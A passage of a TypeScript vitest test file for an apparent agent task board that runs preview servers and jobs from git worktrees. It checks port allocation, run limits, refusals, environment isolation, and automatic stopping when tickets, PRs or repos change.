import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'

import { eq } from 'drizzle-orm'
import { afterEach, beforeAll, describe, expect, it, vi } from 'vitest'

import type { RunConfigInput } from '#/lib/runs'
import type { MyGhPr } from './git'
import type { PreviewRunner, Proc } from './runs'

// The db module opens SQLite at import; point it at a throwaway directory before anything loads it.
const tmp = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), 'agent-board-test-')))
process.env.DATA_DIR = path.join(tmp, 'data')

// gh answers from fixtures: what the PR queue finds, and whether a PR that left it was merged.
let found: MyGhPr[] = []
vi.mock('./git', async (original) => ({
  ...(await original<typeof import('./git')>()),
  listMyPrs: async () => found,
  currentGithubLogin: async () => 'enrique',
  prMerged: async () => false,
}))

let runs: typeof import('./runs')
let rc: typeof import('./runConfig')
let features: typeof import('./features')
let dbm: typeof import('#/db')
let projectId: number

// --- repos on disk: main checkouts, and worktrees next to them ---

const code = path.join(tmp, 'code')
interface RepoOnDisk {
  id: number
  main: string
  name: string
}

function addRepo(name: string, project = projectId, opts: { githubRepo?: string } = {}): RepoOnDisk {
  const main = path.join(code, name)
  fs.mkdirSync(path.join(main, '.git'), { recursive: true })
  const id = dbm.db
    .insert(dbm.schema.repos)
    .values({ projectId: project, name, repoPath: main, githubRepo: opts.githubRepo ?? null })
    .returning()
    .get().id
  return { id, main, name }
}

let wtCount = 0
/** A worktree of the repo next to its main checkout, with what a run of it reads. */
function worktree(repo: RepoOnDisk, files: Record<string, string> = {}) {
  const dir = path.join(code, `${repo.name}-wt${++wtCount}`)
  fs.mkdirSync(dir, { recursive: true })
  fs.writeFileSync(
    path.join(dir, '.git'),
    `gitdir: ${path.join(repo.main, '.git', 'worktrees', path.basename(dir))}\n`,
  )
  for (const [file, text] of Object.entries(files)) fs.writeFileSync(path.join(dir, file), text)
  return dir
}

// --- the fake runner: every process is a promise the test controls ---

type Behaviour = 'answer' | 'run' | 'silent' | number

class FakeRunner implements PreviewRunner {
  calls: {
    command: string
    args: string[]
    cwd: string
    env: NodeJS.ProcessEnv
    pid: number
    shell: boolean
    log: string
  }[] = []
  /** Exit code per install or build command; 'hang' keeps it running. */
  codes: Record<string, number | 'hang'> = {}
  /** What a start command does: answer on its PORT (a preview), run on (a job), stay silent or exit. */
  starts: Record<string, Behaviour> = {}
  busy = new Set<number>()
  up = new Set<string>()
  killed: number[] = []
  asked: string[] = []
  private exits = new Map<number, (code: number | null) => void>()
  private urls = new Map<number, string>()
  private pid = 5000

  spawn(
    command: string,
    args: string[],
    opts: { cwd: string; env: NodeJS.ProcessEnv; log: string; shell?: boolean },
  ): Proc {
    const pid = ++this.pid
    this.calls.push({ command, args, cwd: opts.cwd, env: opts.env, pid, shell: !!opts.shell, log: opts.log })
    fs.appendFileSync(opts.log, `${command} line 1\n${command} line 2\n`)
    const exited = new Promise<number | null>((resolve) => this.exits.set(pid, resolve))
    if (path.basename(opts.log) === 'server.log') {
      const what = this.starts[command] ?? (opts.env.PORT ? 'answer' : 'run')
      if (what === 'answer') {
        const url = `http://127.0.0.1:${opts.env.PORT}`
        this.up.add(url)
        this.urls.set(pid, url)
      } else if (typeof what === 'number') setTimeout(() => this.exits.get(pid)!(what), 0)
    } else {
      const code = this.codes[command] ?? 0
      if (code !== 'hang') setTimeout(() => this.exits.get(pid)!(code), 0)
    }
    return { pid, exited }
  }
  /** The process exits by itself, as a job that crashed. */
  exit(pid: number, code: number) {
    this.exits.get(pid)?.(code)
  }
  async killTree(pid: number) {
    this.killTreeSync(pid)
  }
  killTreeSync(pid: number) {
    this.killed.push(pid)
    const url = this.urls.get(pid)
    if (url) this.up.delete(url)
    this.exits.get(pid)?.(null)
  }
  async isFree(port: number) {
    return !this.busy.has(port)
  }
  async answers(url: string) {
    this.asked.push(url)
    const base = /^http:\/\/127\.0\.0\.1:\d+/.exec(url)![0]
    return this.up.has(base)
  }
  async copyData(dest: string) {
    fs.mkdirSync(dest, { recursive: true })
    fs.writeFileSync(path.join(dest, 'board.db'), 'a copy')
  }
}

let fake: FakeRunner
function useFake() {
  fake = new FakeRunner()
  runs.setPreviewRunner(fake)
  return fake
}

beforeAll(async () => {
  runs = await import('./runs')
  rc = await import('./runConfig')
  features = await import('./features')
  dbm = await import('#/db')
  projectId = dbm.db.insert(dbm.schema.projects).values({ name: 'shop' }).returning().get().id
})

afterEach(async () => {
  // Nothing outlives a test: stop whatever it left running, and the limit goes back to its default.
  for (const r of runs.activeRuns()) await runs.stopRun(r.workspaceId, r.runId, 'test over', 'test')
  runs.setPreviewRunner(null)
  dbm.db.delete(dbm.schema.settings).where(eq(dbm.schema.settings.key, 'previewLimit')).run()
})

const setLimit = (n: number) =>
  dbm.db
    .insert(dbm.schema.settings)
    .values({ key: 'previewLimit', value: n })
    .onConflictDoUpdate({ target: dbm.schema.settings.key, set: { value: n } })
    .run()

const run = (repo: RepoOnDisk, over: Partial<RunConfigInput> & { name: string }) =>
  rc.createRunConfig(
    repo.id,
    {
      type: 'preview',
      install: '',
      build: '',
      start: 'node server.js',
      env: {},
      port: null,
      copyData: false,
      ...over,
    },
    'enrique',
  )

/** A ticket in progress in `repo` with a workspace on a fresh worktree of it. */
function ticketIn(repo: RepoOnDisk, over: { branch?: string; files?: Record<string, string> } = {}) {
  const t = features.createTicket(
    projectId,
    { title: 'run me', status: 'in_progress', repoId: repo.id, branch: over.branch ?? '' },
    'claude',
  )
  const dir = worktree(repo, over.files)
  const ws = features.addWorkspace(t.id, { name: 'wt', branch: over.branch ?? 'feat', path: dir }, 'claude')
  return { t, ws, dir }
}

const state = (wsId: number, runId: number) => runs.runState(wsId, runId)
const status = (wsId: number, runId: number) => state(wsId, runId)?.status
const wsRow = (id: number) =>
  dbm.db.select().from(dbm.schema.workspaces).where(eq(dbm.schema.workspaces.id, id)).get()!

async function running(wsId: number, runId: number) {
  runs.startRun(wsId, runId, 'claude')
  await vi.waitFor(() => expect(status(wsId, runId)).toBe('running'))
  return state(wsId, runId)!
}

async function call(method: string, pathname: string, body?: unknown, as: 'human' | 'agent' = 'human') {
  const { api } = await import('./api')
  const { api: guard } = await import('./http')
  const handle = guard(({ request, actor }: { request: Request; actor: string }) =>
    api.handle(request, actor),
  )
  const request = new Request(`http://localhost${pathname}`, {
    method,
    headers: {
      accept: 'application/json, text/event-stream',
      ...(body === undefined ? {} : { 'content-type': 'application/json' }),
      ...(as === 'agent' ? { authorization: 'Bearer token-of-test' } : {}),
    },
    body: body === undefined ? undefined : JSON.stringify(body),
  })
  return handle({ request, actor: as === 'agent' ? 'claude' : 'enrique' })
}
async function tool(name: string, args: Record<string, unknown>) {
  const res = await call(
    'POST',
    '/api/mcp',
    { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name, arguments: args } },
    'agent',
  )
  const { result } = (await res.json()) as { result: { isError?: boolean; content: { text: string }[] } }
  return { error: !!result.isError, text: result.content[0]!.text }
}

describe('a configured run', () => {
  it('runs exactly its commands through the shell in the worktree, with its env and its port', async () => {
    useFake()
    const repo = addRepo('api')
    const web = run(repo, {
      name: 'Web',
      install: 'npm ci',
      build: 'npm run build',
      start: 'npm start -- --port {port}',
      env: { API_URL: 'http://127.0.0.1:{port}/api', MODE: 'preview' },
      healthPath: '/health',
    })
    const { ws, dir } = ticketIn(repo, { files: { 'package-lock.json': '{}' } })
    const started = runs.startRun(ws.id, web.id, 'claude')
    expect(started).toMatchObject({ status: 'building', runName: 'Web', runType: 'preview', path: dir })
    await vi.waitFor(() => expect(status(ws.id, web.id)).toBe('running'))
    const s = state(ws.id, web.id)!
    const port = s.port!
    expect(port).toBeGreaterThanOrEqual(47101)
    expect(fake.calls.map((c) => c.command)).toEqual([
      'npm ci',
      'npm run build',
      `npm start -- --port ${port}`,
    ])
    expect(fake.calls.every((c) => c.cwd === dir && c.shell)).toBe(true)
    const start = fake.calls[2]!
    expect(start.env).toMatchObject({
      API_URL: `http://127.0.0.1:${port}/api`,
      MODE: 'preview',
      PORT: String(port),
      HOST: '127.0.0.1',
      PREVIEW_PARENT_PID: String(process.pid),
    })
    // The board's watchdog goes with whatever Node it starts; no copy of the data, so no DATA_DIR.
    expect(start.env.NODE_OPTIONS).toMatch(/--import=data:text\/javascript,/)
    expect(start.env).not.toHaveProperty('DATA_DIR')
    // Its health path is what is asked; its link is the server's root.
    expect(fake.asked).toContain(`http://127.0.0.1:${port}/health`)
    expect(s.url).toBe(`http://127.0.0.1:${port}`)
    expect(wsRow(ws.id).previewUrl).toBe(s.url)
    // Its logs are in the worktree, kept out of git.
    expect(s.logs.server).toBe(path.join(dir, 'data', 'runs', 'web', 'logs', 'server.log'))
    expect(fs.readFileSync(path.join(dir, 'data', 'runs', '.gitignore'), 'utf8')).toBe('*\n')
  })

  it('skips an empty install or build, and installs again only when the lockfile changed', async () => {
    useFake()
    const repo = addRepo('py')
    const worker = run(repo, {
      name: 'Worker',
      type: 'job',
      install: 'pip install -r requirements.txt',
      start: 'python worker.py',
      healthPath: '',
    })
    const bare = run(repo, { name: 'Bare', type: 'job', start: 'python other.py', healthPath: '' })
    const { ws, dir } = ticketIn(repo, { files: { 'requirements.txt': 'flask\n' } })
    await running(ws.id, bare.id)
    expect(fake.calls.map((c) => c.command)).toEqual(['python other.py'])

    await running(ws.id, worker.id)
    expect(fake.calls.map((c) => c.command).slice(1)).toEqual([
      'pip install -r requirements.txt',
      'python worker.py',
    ])
    await runs.stopRun(ws.id, worker.id, 'again', 'enrique')
    await running(ws.id, worker.id)
    // The lockfile did not change: no install this time.
    expect(fake.calls.map((c) => c.command).slice(3)).toEqual(['python worker.py'])
    await runs.stopRun(ws.id, worker.id, 'again', 'enrique')
    fs.writeFileSync(path.join(dir, 'requirements.txt'), 'flask\nredis\n')
    await running(ws.id, worker.id)
    expect(fake.calls.map((c) => c.command).slice(4)).toEqual([
      'pip install -r requirements.txt',
      'python worker.py',
    ])
  })

  it('a job gets no port nor link, and fails with its log when it exits by itself', async () => {
    useFake()
    const repo = addRepo('jobs')
    const worker = run(repo, { name: 'Queue worker', type: 'job', start: 'node worker.js', healthPath: '' })
    const { ws } = ticketIn(repo)
    features.setWorkspacePreview(ws.id, 'http://localhost:47188', 'claude')
    const s = await running(ws.id, worker.id)
    expect(s).toMatchObject({ runType: 'job', port: null, url: null })
    const start = fake.calls.at(-1)!
    expect(start.env).not.toHaveProperty('PORT')
    expect(start.env).not.toHaveProperty('HOST')
    // `node <file>` runs under the board's own Node with the watchdog, as the board's preview does.
    expect(start.command).toBe(process.execPath)
    expect(start.args).toEqual(['--import', expect.stringMatching(/^data:text\/javascript,/), 'worker.js'])
    // While it runs, its state carries what its log says lately.
    expect(state(ws.id, worker.id)!.tail).toEqual([
      `${process.execPath} line 1`,
      `${process.execPath} line 2`,
    ])
    expect(state(ws.id, worker.id)!.tailLog).toBe('server')

    fake.exit(start.pid, 3)
    await vi.waitFor(() => expect(status(ws.id, worker.id)).toBe('failed'))
    expect(state(ws.id, worker.id)).toMatchObject({
      reason: 'the job exited (exit 3)',
      tailLog: 'server',
      url: null,
      port: null,
    })
    expect(state(ws.id, worker.id)!.tail.at(-1)).toMatch(/line 2/)
    expect(wsRow(ws.id).previewUrl).toBe('http://localhost:47188')
  })

  it('fails with the build log when a step fails, and with the server log when a preview does not answer', async () => {
    useFake()
    const repo = addRepo('broken')
    const web = run(repo, { name: 'Web', build: 'make', healthPath: '/' })
    const { ws } = ticketIn(repo)
    fake.codes.make = 2
    runs.startRun(ws.id, web.id, 'claude')
    await vi.waitFor(() => expect(status(ws.id, web.id)).toBe('failed'))
    expect(state(ws.id, web.id)).toMatchObject({
      reason: 'make failed (exit 2)',
      tailLog: 'build',
      port: null,
    })
    expect(state(ws.id, web.id)!.tail).toEqual(['> make', 'make line 1', 'make line 2'])
    expect(runs.runLog(ws.id, web.id, 'build')).toContain('make line 2')
  })
})

describe('ports', () => {
  it('two starts at once take two ports; a stopped one frees its port for the next', async () => {
    useFake()
    const repo = addRepo('ports')
    const web = run(repo, { name: 'Web' })
    const [a, b, c] = [ticketIn(repo), ticketIn(repo), ticketIn(repo)]
    runs.startRun(a.ws.id, web.id, 'claude')
    runs.startRun(b.ws.id, web.id, 'claude')
    await vi.waitFor(() =>
      expect([status(a.ws.id, web.id), status(b.ws.id, web.id)]).toEqual(['running', 'running']),
    )
    expect([state(a.ws.id, web.id)!.port, state(b.ws.id, web.id)!.port].sort()).toEqual([47101, 47102])
    const first = state(a.ws.id, web.id)!.port
    await runs.stopRun(a.ws.id, web.id, 'make room', 'enrique')
    expect(state(a.ws.id, web.id)!.port).toBeNull()
    expect((await running(c.ws.id, web.id)).port).toBe(first)
  })

  it('a fixed port is taken as it is, or the start fails saying it is in use', async () => {
    useFake()
    const repo = addRepo('fixed')
    const web = run(repo, { name: 'Web', port: 47150 })
    const a = ticketIn(repo)
    expect((await running(a.ws.id, web.id)).port).toBe(47150)
    const b = ticketIn(repo)
    runs.startRun(b.ws.id, web.id, 'claude')
    await vi.waitFor(() => expect(status(b.ws.id, web.id)).toBe('failed'))
    expect(state(b.ws.id, web.id)!.reason).toBe('port 47150 is in use')
    await runs.stopRun(a.ws.id, web.id, 'free it', 'enrique')
    fake.busy.add(47150)
    runs.startRun(b.ws.id, web.id, 'claude')
    await vi.waitFor(() => expect(status(b.ws.id, web.id)).toBe('failed'))
    expect(state(b.ws.id, web.id)!.reason).toBe('port 47150 is in use')
  })

  it('no free port: the start fails saying so', async () => {
    useFake()
    for (let port = 47101; port <= 47199; port++) fake.busy.add(port)
    const repo = addRepo('full')
    const web = run(repo, { name: 'Web' })
    const { ws } = ticketIn(repo)
    runs.startRun(ws.id, web.id, 'claude')
    await vi.waitFor(() => expect(status(ws.id, web.id)).toBe('failed'))
    expect(state(ws.id, web.id)!.reason).toBe('no free port between 47101 and 47199')
  })
})

describe('what may start', () => {
  it('a preview and a job of one worktree run side by side; the same run twice from it is refused', async () => {
    useFake()
    const repo = addRepo('side')
    const web = run(repo, { name: 'Web' })
    const worker = run(repo, { name: 'Worker', type: 'job', start: 'python w.py', healthPath: '' })
    const { t, ws, dir } = ticketIn(repo)
    await running(ws.id, web.id)
    await running(ws.id, worker.id)
    expect(() => runs.startRun(ws.id, web.id, 'claude')).toThrow(/already running/)
    const twin = features.addWorkspace(t.id, { name: 'twin', path: dir }, 'claude')
    expect(runs.cannotStartRun(twin.id, web.id)).toBe(
      `workspace ${ws.id} already runs a preview from ${dir} (Web)`,
    )
    expect(() => runs.startRun(twin.id, worker.id, 'claude')).toThrow(/already runs a job/)
  })

  it('any repo with a run may run it: what the checkout is does not matter', async () => {
    useFake()
    const repo = addRepo('python-service')
    const worker = run(repo, { name: 'Celery', type: 'job', start: 'celery -A app worker', healthPath: '' })
    const { ws } = ticketIn(repo, { files: { 'pyproject.toml': '[project]\nname = "svc"\n' } })
    expect(runs.cannotStartRun(ws.id, worker.id)).toBeNull()
    await running(ws.id, worker.id)
  })

  it("refuses the repo's main checkout, a run of another repo, and starts on a preview board", async () => {
    useFake()
    const repo = addRepo('guarded')
    const other = addRepo('elsewhere')
    const web = run(repo, { name: 'Web' })
    const foreign = run(other, { name: 'Web' })
    const t = features.createTicket(
      projectId,
      { title: 'at main', status: 'in_progress', repoId: repo.id },
      'claude',
    )
    const atMain = features.addWorkspace(t.id, { name: 'main', path: repo.main }, 'claude')
    expect(runs.cannotStartRun(atMain.id, web.id)).toMatch(/^that is the repo's main checkout/)
    const { ws } = ticketIn(repo)
    expect(runs.cannotStartRun(ws.id, foreign.id)).toMatch(/run of another repo/)
    const config = await import('./config')
    const dev = vi
      .spyOn(config, 'authMode')
      .mockReturnValue({ boardEnv: 'development', off: true, human: 'h' })
    try {
      expect(runs.cannotStartRun(ws.id, web.id)).toBe(
        'runs are started by the live board (or a test-mode one), not by a preview',
      )
    } finally {
      dev.mockRestore()
    }
    expect(fake.calls).toEqual([])
  })

  it('the preview limit counts jobs and building runs; a restart of a running one is allowed at it', async () => {
    useFake()
    setLimit(2)
    const repo = addRepo('limited')
    const web = run(repo, { name: 'Web', build: 'slow build' })
    const worker = run(repo, { name: 'Worker', type: 'job', start: 'python w.py', healthPath: '' })
    fake.codes['slow build'] = 'hang'
    const a = ticketIn(repo)
    await running(a.ws.id, worker.id)
    runs.startRun(a.ws.id, web.id, 'claude')
    expect(status(a.ws.id, web.id)).toBe('building')
    const b = ticketIn(repo)
    expect(() => runs.startRun(b.ws.id, worker.id, 'claude')).toThrow(
      '2 previews already run, at most 2 (the preview limit): stop one first',
    )
    expect((await runs.restartRun(a.ws.id, worker.id, 'enrique')).status).toBe('building')
    expect(runs.runsInUse()).toBe(2)
  })
})

describe('the environment of a run', () => {
  it("leaves the live board's own settings out unless the run sets them itself", async () => {
    const board = {
      BOARD_ENV: 'production',
      AUTH: 'on',
      DEV_HUMAN: 'enrique',
      TEST_HUMAN: 'enrique',
      PUBLIC_ORIGIN: 'https://devbox.example-tailnet.ts.net',
      TAILNET_HOST: 'devbox.example-tailnet.ts.net',
      S3_BUCKET: 'board',
      STORAGE: 's3',
      NITRO_PORT: '47100',
      NODE_ENV: 'production',
      DATA_DIR: '/live/data',
      BOARD_URL: 'http://localhost:47100',
    }
    for (const [key, value] of Object.entries(board)) vi.stubEnv(key, value)
    try {
      useFake()
      const repo = addRepo('clean-env')
      const web = run(repo, { name: 'Web', build: 'make', env: { BOARD_URL: 'http://127.0.0.1:{port}' } })
      const { ws } = ticketIn(repo)
      const s = await running(ws.id, web.id)
      for (const call of fake.calls)
        for (const key of Object.keys(board).filter((k) => k !== 'BOARD_URL' || call.command === 'make'))
          expect(call.env, `${call.command}: ${key}`).not.toHaveProperty(key)
      expect(fake.calls.at(-1)!.env.BOARD_URL).toBe(`http://127.0.0.1:${s.port}`)
      expect(fake.calls.at(-1)!.env.HOST).toBe('127.0.0.1')
    } finally {
      vi.unstubAllEnvs()
    }
  })
})

describe('stops by itself', () => {
  it('when the ticket is archived, its run is deleted from the settings, or its repo is deleted', async () => {
    useFake()
    const repo = addRepo('stopping')
    const worker = run(repo, { name: 'Worker', type: 'job', start: 'python w.py', healthPath: '' })
    const a = ticketIn(repo)
    await running(a.ws.id, worker.id)
    dbm.db.update(dbm.schema.tickets).set({ status: 'done' }).where(eq(dbm.schema.tickets.id, a.t.id)).run()
    features.archiveTicket(a.t.id, 'enrique')
    await vi.waitFor(() => expect(status(a.ws.id, worker.id)).toBe('stopped'))
    expect(state(a.ws.id, worker.id)!.reason).toBe('the ticket was archived')

    const b = ticketIn(repo)
    await running(b.ws.id, worker.id)
    const res = await call('DELETE', `/api/runs/${worker.id}`)
    expect(res.status).toBe(200)
    await vi.waitFor(() => expect(state(b.ws.id, worker.id)).toBeNull())

    const web = run(repo, { name: 'Web' })
    const c = ticketIn(repo)
    const server = (await running(c.ws.id, web.id)) && fake.calls.at(-1)!
    const repos = await import('./repos')
    repos.deleteRepo(repo.id, 'enrique')
    await vi.waitFor(() => expect(fake.killed).toContain(server.pid))
    expect(runs.activeRuns().some((r) => r.repoId === repo.id)).toBe(false)
  })

  it('when the ticket moves to done, with its link cleared', async () => {
    useFake()
    const repo = addRepo('closing')
    const web = run(repo, { name: 'Web' })
    const { t, ws } = ticketIn(repo)
    await running(ws.id, web.id)
    features.updateTicket(t.id, { status: 'done' }, 'enrique')
    await vi.waitFor(() => expect(status(ws.id, web.id)).toBe('stopped'))
    expect(state(ws.id, web.id)!.reason).toBe('the ticket moved to Done')
    expect(wsRow(ws.id).previewUrl).toBe('')
  })
})

describe('a ticket that spans two repos', () => {
  const queuePr = (number: number, headRefName: string, mergedAt: string | null = null) =>
    ({
      number,
      title: `pr ${number}`,
      url: `https://github.com/acme/front/pull/${number}`,
      author: { login: 'enrique' },
      headRefName,
      baseRefName: 'main',
      headRefOid: 'abc1234',
      isDraft: false,
      reviewDecision: '',
      mergeable: 'MERGEABLE',
      mergeStateStatus: 'CLEAN',
      statusCheckRollup: [],
      updatedAt: '2026-10-01T10:00:00Z',
      mergedAt,
      reviews: [],
      reviewRequests: [],
      comments: [],
      requested: false,
      assigned: true,
    }) satisfies MyGhPr

  it('lists every run of both repos, starts them all at once and stops them by repo', async () => {
    useFake()
    const project = dbm.db.insert(dbm.schema.projects).values({ name: 'two' }).returning().get().id
    const front = addRepo('front', project, { githubRepo: 'acme/front' })
    const back = addRepo('back', project)
    const web = run(front, { name: 'Web' })
    const api = run(back, { name: 'API' })
    const worker = run(back, { name: 'Worker', type: 'job', start: 'python w.py', healthPath: '' })
    const t = features.createTicket(
      project,
      {
        title: 'both',
        status: 'in_progress',
        repos: [
          { repoId: front.id, branch: 'feat/front' },
          { repoId: back.id, branch: 'feat/back' },
        ],
      },
      'claude',
    )
    const frontWs = features.addWorkspace(
      t.id,
      { name: 'front', branch: 'feat/front', path: worktree(front) },
      'claude',
    )

    // The back repo has no worktree yet: Start all starts the front's run and says why not the others.
    const all = await call('POST', `/api/tickets/${t.id}/runs/start`)
    expect(all.status).toBe(200)
    const { results } = (await all.json()) as {
      results: { name: string; ok: boolean; reason: string | null }[]
    }
    expect(results.map((r) => [r.name, r.ok])).toEqual([
      ['Web', true],
      ['API', false],
      ['Worker', false],
    ])
    expect(results[1]!.reason).toMatch(/^the ticket has no worktree of back: register it/)
    await vi.waitFor(() => expect(status(frontWs.id, web.id)).toBe('running'))

    const backWs = features.addWorkspace(
      t.id,
      { name: 'back', branch: 'feat/back', path: worktree(back), repoId: back.id },
      'claude',
    )
    const listed = (await (
      await call('GET', `/api/tickets/${t.id}/runs`)
    ).json()) as import('./ticketRuns').TicketRuns
    expect(listed.repos.map((r) => [r.name, r.primary, r.workspace?.id, r.runs.map((x) => x.name)])).toEqual([
      ['front', true, frontWs.id, ['Web']],
      ['back', false, backWs.id, ['API', 'Worker']],
    ])
    expect(listed.repos[0]!.runs[0]!.state).toMatchObject({ status: 'running', url: expect.any(String) })
    expect(listed.repos[1]!.runs[0]).toMatchObject({ state: null, cannotStart: null, workspaceId: backWs.id })

    // Start all, the back's only.
    const backOnly = await call('POST', `/api/tickets/${t.id}/runs/start`, { repoId: back.id })
    expect(((await backOnly.json()) as { results: { ok: boolean }[] }).results.every((r) => r.ok)).toBe(true)
    await vi.waitFor(() =>
      expect([status(backWs.id, api.id), status(backWs.id, worker.id)]).toEqual(['running', 'running']),
    )

    // The front's PR merges: only the front's run stops.
    const prs = await import('./prs')
    found = [queuePr(71, 'feat/front')]
    await prs.refreshPrs(project)
    found = [queuePr(71, 'feat/front', new Date().toISOString())]
    await prs.refreshPrs(project)
    await vi.waitFor(() => expect(status(frontWs.id, web.id)).toBe('stopped'))
    expect(state(frontWs.id, web.id)!.reason).toBe('PR #71 was merged')
    expect([status(backWs.id, api.id), status(backWs.id, worker.id)]).toEqual(['running', 'running'])

    // Stop all, then a repo taken off the ticket stops its runs for it.
    await running(frontWs.id, web.id)
    const stopped = await call('POST', `/api/tickets/${t.id}/runs/stop`, { repoId: back.id })
    expect(((await stopped.json()) as { results: unknown[] }).results).toHaveLength(2)
    expect(status(frontWs.id, web.id)).toBe('running')
    await running(backWs.id, worker.id)
    features.updateTicket(t.id, { repos: [{ repoId: front.id }] }, 'enrique')
    await vi.waitFor(() => expect(status(backWs.id, worker.id)).toBe('stopped'))
    expect(state(backWs.id, worker.id)!.reason).toBe('back was removed from the ticket')
    expect(status(frontWs.id, web.id)).toBe('running')
  })

  it("a repo taken off the ticket cannot run again from the ticket's worktree of it", async () => {
    useFake()
    const project = dbm.db.insert(dbm.schema.projects).values({ name: 'dropped' }).returning().get().id
    const front = addRepo('front-d', project)
    const back = addRepo('back-d', project)
    const web = run(front, { name: 'Web' })
    const worker = run(back, { name: 'Worker', type: 'job', start: 'python w.py', healthPath: '' })
    const api = run(back, { name: 'API' })
    const t = features.createTicket(
      project,
      { title: 'both', status: 'in_progress', repos: [{ repoId: front.id }, { repoId: back.id }] },
      'claude',
    )
    const frontWs = features.addWorkspace(
      t.id,
      { name: 'front', branch: 'f', path: worktree(front) },
      'claude',
    )
    const backWs = features.addWorkspace(
      t.id,
      { name: 'back', branch: 'b', path: worktree(back), repoId: back.id },
      'claude',
    )
    await running(backWs.id, worker.id)
    features.updateTicket(t.id, { repos: [{ repoId: front.id }] }, 'enrique')
    await vi.waitFor(() => expect(status(backWs.id, worker.id)).toBe('stopped'))
    const spawned = fake.calls.length

    const refused = /^back-d is not one of ticket \d+'s repos$/
    expect(runs.cannotStartRun(backWs.id, worker.id)).toMatch(refused)
    const start = await call(
      'POST',
      `/api/workspaces/${backWs.id}/runs/${worker.id}/start`,
      undefined,
      'agent',
    )
    expect(start.status).toBe(400)
    expect(((await start.json()) as { error: string }).error).toMatch(refused)
    const restart = await call(
      'POST',
      `/api/workspaces/${backWs.id}/runs/${worker.id}/restart`,
      undefined,
      'agent',
    )
    expect(restart.status).toBe(400)
    expect(await tool('start_preview', { workspaceId: backWs.id })).toMatchObject({
      error: true,
      text: expect.stringMatching(/is not one of ticket \d+'s repos/),
    })
    expect(await tool('start_run', { ticketId: t.id, run: 'API', repoId: back.id })).toMatchObject({
      error: true,
    })
    expect(fake.calls.length).toBe(spawned)
    expect([status(backWs.id, worker.id), state(backWs.id, api.id)]).toEqual(['stopped', null])

    // The ticket's own repo still runs from its worktree.
    expect(runs.cannotStartRun(frontWs.id, web.id)).toBeNull()
  })

  it('a repo moved to another project leaves the tickets it does not take, and its runs for them stop', async () => {
    useFake()
    const from = dbm.db.insert(dbm.schema.projects).values({ name: 'from' }).returning().get().id
    const to = dbm.db.insert(dbm.schema.projects).values({ name: 'to' }).returning().get().id
    const front = addRepo('front-m', from)
    const back = addRepo('back-m', from)
    const side = addRepo('side-m', from)
    const web = run(front, { name: 'Web' })
    const backJob = run(back, { name: 'Worker', type: 'job', start: 'python w.py', healthPath: '' })
    const sideJob = run(side, { name: 'Worker', type: 'job', start: 'python s.py', healthPath: '' })
    // t stays in `from` (its primary is front); u goes with back, its primary, and leaves side behind.
    const t = features.createTicket(
      from,
      { title: 'stays', status: 'in_progress', repos: [{ repoId: front.id }, { repoId: back.id }] },
      'claude',
    )
    const u = features.createTicket(
      from,
      { title: 'moves', status: 'in_progress', repos: [{ repoId: back.id }, { repoId: side.id }] },
      'claude',
    )
    const tFront = features.addWorkspace(
      t.id,
      { name: 'front', branch: 'f', path: worktree(front) },
      'claude',
    )
    const tBack = features.addWorkspace(
      t.id,
      { name: 'back', branch: 'b', path: worktree(back), repoId: back.id },
      'claude',
    )
    const uSide = features.addWorkspace(
      u.id,
      { name: 'side', branch: 's', path: worktree(side), repoId: side.id },
      'claude',
    )
    await running(tFront.id, web.id)
    const tJob = (await running(tBack.id, backJob.id)) && fake.calls.at(-1)!
    const uJob = (await running(uSide.id, sideJob.id)) && fake.calls.at(-1)!

    const moved = await call('PATCH', `/api/repos/${back.id}`, { projectId: to })
    expect(moved.status).toBe(200)

    await vi.waitFor(() => expect(fake.killed).toEqual(expect.arrayContaining([tJob.pid, uJob.pid])))
    expect(state(tBack.id, backJob.id)).toMatchObject({
      status: 'stopped',
      reason: 'back-m moved to project to',
    })
    expect(state(uSide.id, sideJob.id)).toMatchObject({
      status: 'stopped',
      reason: 'the ticket moved to project to with back-m; side-m stays in from',
    })
    expect(status(tFront.id, web.id)).toBe('running')
    expect(runs.activeRuns().map((r) => r.repoId)).toEqual([front.id])

    // Neither ticket lists a repo outside its project any more, nor keeps a row for it.
    const repoIds = async (id: number) =>
      ((await (await call('GET', `/api/tickets/${id}`)).json()) as { repos: { repoId: number }[] }).repos.map(
        (r) => r.repoId,
      )
    expect(await repoIds(t.id)).toEqual([front.id])
    expect(await repoIds(u.id)).toEqual([back.id])
    const rows = (id: number) =>
      dbm.db
        .select()
        .from(dbm.schema.ticketRepos)
        .where(eq(dbm.schema.ticketRepos.ticketId, id))
        .all()
        .map((r) => r.repoId)
    expect(rows(t.id)).toEqual([front.id])
    expect(rows(u.id)).toEqual([back.id])
    expect(runs.cannotStartRun(tBack.id, backJob.id)).toMatch(/is not one of ticket \d+'s repos/)
  })

  it("a repo moved away stops its runs for a ticket that stays and ran it as the project's first repo", async () => {
    useFake()
    const from = dbm.db.insert(dbm.schema.projects).values({ name: 'from-f' }).returning().get().id
    const to = dbm.db.insert(dbm.schema.projects).values({ name: 'to-f' }).returning().get().id
    const only = addRepo('aa-f', from)
    const next = addRepo('bb-f', from)
    const job = run(next, { name: 'Worker', type: 'job', start: 'python w.py', healthPath: '' })
    const t = features.createTicket(
      from,
      { title: 'left without a repo', status: 'in_progress', repoId: only.id, branch: 'x' },
      'claude',
    )
    // Its only repo goes: the ticket has no repo of its own and no rows, and runs the project's first.
    expect((await call('DELETE', `/api/repos/${only.id}`)).status).toBe(200)
    expect(features.getTicket(t.id).repoId).toBeNull()
    const ws = features.addWorkspace(
      t.id,
      { name: 'bb', branch: 'x', path: worktree(next), repoId: next.id },
      'claude',
    )
    const proc = (await running(ws.id, job.id)) && fake.calls.at(-1)!

    const moved = await call('PATCH', `/api/repos/${next.id}`, { projectId: to })
    expect(moved.status).toBe(200)
    expect(features.getTicket(t.id).projectId).toBe(from)

    await vi.waitFor(() => expect(fake.killed).toContain(proc.pid))
    expect(state(ws.id, job.id)).toMatchObject({ status: 'stopped', reason: 'bb-f moved to project to-f' })
    expect(runs.activeRuns()).toEqual([])
  })

  describe("a run of a repo that stops being the ticket's without being taken off it", () => {
    /**
     * A ticket left with no repo of its own (its only one deleted) that runs the project's first repo,
     * `pp`, from its worktree of it: Worker (a job) and Web (a preview).
     */
    async function rowless(tag: string) {
      const project = dbm.db
        .insert(dbm.schema.projects)
        .values({ name: `rowless ${tag}` })
        .returning()
        .get().id
      const gone = addRepo(`mm-${tag}`, project)
